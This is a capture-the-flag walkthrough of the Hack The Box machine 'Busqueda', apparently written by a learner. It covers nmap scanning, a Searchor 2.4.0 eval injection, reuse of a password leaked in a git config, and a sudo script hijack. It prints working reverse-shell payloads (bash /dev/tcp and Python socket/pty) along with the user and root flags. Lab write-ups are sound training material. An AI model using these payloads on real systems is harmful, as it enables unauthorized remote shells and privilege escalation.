# About

- Operating System: Linux
- Point Value: 30 Total (20 System and 10 for User)
- Level: Easy
- Target IP Address: 10.129.138.207

# Vulnerabilities

- Reserve Shell Exploit

# Walkthrough

## HTB Pwnbox (Parrot)

Open Terminal and then do an nmap scan. `nmap -sV 10.129.138.207`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b5b62aff-a5f7-48a9-9d72-dab6f029c389/Untitled.png)

This nmap scan shows port 80 is open which we can use. When opening the browser go to `10.129.138.207` , it re-directs to `searcher.htb` . 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/627f93b5-7c3f-44ba-bd35-70ba5e1d287f/Untitled.png)

It is necessary to modify the /etc/hosts. To do this, you will need to do `sudo nano /etc/hosts` and then add `10.129.138.207 searcher.htb`. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/987063fa-08af-4536-8b2f-3146120ad842/Untitled.png)

*Note: If you try accessing /etc/hosts just by doing `nano /etc/hosts` to modify and save, you get a Permission denied message.*

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3580f088-1262-48a5-b18a-e9f0caa90f87/Untitled.png)

After successfully exiting and saving /etc/hosts, go back to the browser and try accessing `10.129.138.207` again. The site comes up and shows the following:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f18014d4-7a02-442d-8906-04082f9fa6bc/Untitled.png)

When scrolling to the very bottom, I saw “Powered by Flash and Searchor 2.4.0”

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/74fb4379-b0a3-4a5b-b1fc-619eaf4821a6/Untitled.png)

When doing a search for “Searchor 2.40 exploit”, I found the following [GitHub](https://github.com/jonnyzar/POC-Searchor-2.4.2). I can then go back to my terminal and do a `git clone https://github.com/jonnyzar/POC-Searchor-2.4.2.git` .

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f842d638-4aaa-4d65-859a-118dca727055/Untitled.png)

After download complete, I can confirm by doing a `ls` and see POC-Searchor-2.4.2 is saved. I can then change directory (`cd POC-Searchor-2.4.2`) and run another `ls` to see the items listed there.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e7ae5242-630d-46c2-8c6f-546126855000/Untitled.png)

I can then did `cat [README.md](http://README.md)` to read the file. When reading the file, it mentions Python eval. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ac853081-a7c0-4431-ade7-73648c5e3908/Untitled.png)

So I did some research and found a site that mentions [Arbitrary Code Execution](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/). I copied the code under Reverse Shell `__import('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/45dfe8da-299b-46b6-81f8-3dec04d2be9b/Untitled.png)

I then had to modify this code by adding `'),` , modifying the IP address to `10.10.14.12` (which is my computer) and adding at the end a space and `#` . This is how the whole thing looked like: `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1"') #` . I found this by doing combinations of the Arbitrary Code Execution listed above the Reverse Shell.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dedcaece-de9a-41ad-a8e7-c4c179460363/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/70cd94b4-319b-454c-a7f8-2416173ea81e/Untitled.png)

After typing in my terminal `nc -lvnp 4444` and then clicking “Search”, the following showed on my terminal. I also typed `whoami` to confirm.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7faa7cc1-c012-4ddc-ba17-9eaed4a95e88/Untitled.png)

I then ran the following commands: `ls -la` `cd .git` `ls -la` 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5dfe3d11-f4f0-4365-aae4-9a0b4d50d3d5/Untitled.png)

After running `cat config` , I came across the following. `jh1usoih2bkjaspwe92` turns out is the password

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5cecbca6-f778-4441-be47-b4def3aa8cad/Untitled.png)

I created a second terminal session and did `ssh svc@10.129.138.207` . When prompted for the ECDSA key fingerprint, typed`yes` . For the password, I put `jh1usoih2bkjaspwe92` .

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a38ec09-f797-4075-b5b9-7e06c337bf93/Untitled.png)

I used the command`whoami` to confirm.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/149e5f46-8440-405f-86f9-fbc084e2fa1f/Untitled.png)

When running `ls -la` , I saw the file `user.txt`. So I can `cat user.txt` and found the user flag.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f71c4a83-5ab0-4e66-bf5c-c0d9067e3e3a/Untitled.png)

User Flag: `8bae7d0bac9792fcb1a6fc7bedf96360`

I went ahead and ran `sudo -l` to see check commands. I see the command `/usr/bin/python3 /opt/scripts/system-checkup.py *` and ran it. Again, it prompted for the password `jh1usoih2bkjaspwe92` .

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c430f45e-bd9d-4a34-9732-b8e1a2f31099/Untitled.png)

I ran the command `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *` and then the password `jh1usoih2bkjaspwe92` .

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dd400596-cf03-4ceb-935c-263cb55fe372/Untitled.png)

I ran `cd /opt/scripts` and `ls` and saw full-checkup.sh

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a2a18672-58e5-4eff-b3c1-a82204110b2c/Untitled.png)

I executed `cd -` and `touch [full-checkup.sh](http://full-checkup.sh)` to download the file.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f3c82fb9-3308-4ad6-9d15-3da3cd3f28be/Untitled.png)

I research Python Privilege Escalation and found [this](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/) that executes a reverse shell.

`import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")` . I would need to modify to remove “<local-ip>” to replace it with my machine IP address.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/91f8bc91-c464-40db-861f-5b6700e4476b/Untitled.png)

I opened another terminal (third one if you are counting) and ran `nano [full-checkup.sh](http://full-checkup.sh)` to modify the file.

`#!/usr/bin/python3`
`import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d96fb74-9758-4854-9606-73c0b8f69a0c/Untitled.png)

*Hint: If you don’t like nano, you can also use gedit. You may need to install it first by running `sudo apt-get install gedit` and then `gedit [full-checkup.sh](http://full-checkup.sh)` to modify the file.*

Once you save and exit, you will need to start a server by running `python -m http.server`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa851108-84bd-4df4-b0a9-dc6147e4fc3d/Untitled.png)

Switching back to the second terminal, you need to run a wget to pull the file. `wget http://10.10.14.12:8000/full-checkup.sh`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/64ca4411-2f76-4f4b-9632-4d8ad93be65d/Untitled.png)

You can see on the third terminal shows the `get`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5af0e0fd-ea08-435d-b8e4-aebf0577e863/Untitled.png)

On the second terminal, need to modify the permission of the file using `chmod +x full-checkup.sh`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b96494c7-046f-48ff-908f-fb4f3fe0f0de/Untitled.png)

Now on the fourth terminal (don’t worry, this is the last one), I ran `sudo su` and `nc -lnvp 4444`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6f100457-5ff6-40a6-927f-6971c79ac659/Untitled.png)

I switched back to my second terminal and execute the command `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` . It again requested the password (same thing as above). 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5d73eae2-00ee-42a9-a088-80a5f077e9a9/Untitled.png)

*Hint: If you get an error here, you didn’t something wrong.*

Switching back over to my fourth terminal, I have root@busqueda access. I also ran `whoami` to confirm. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c4c191e3-80ee-4d89-9098-4e6ba1f40f78/Untitled.png)

I then did `cd /root` , `ls -la` and saw the `root.txt` file. So I ran `cat root.txt` and got the root flag.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c3dabc54-3d3f-446e-a287-84488801b0c2/Untitled.png)

# Flag

User Flag: `8bae7d0bac9792fcb1a6fc7bedf96360`

Root Flag: `4e40b0065928fb42069eb24c0c647ddc`
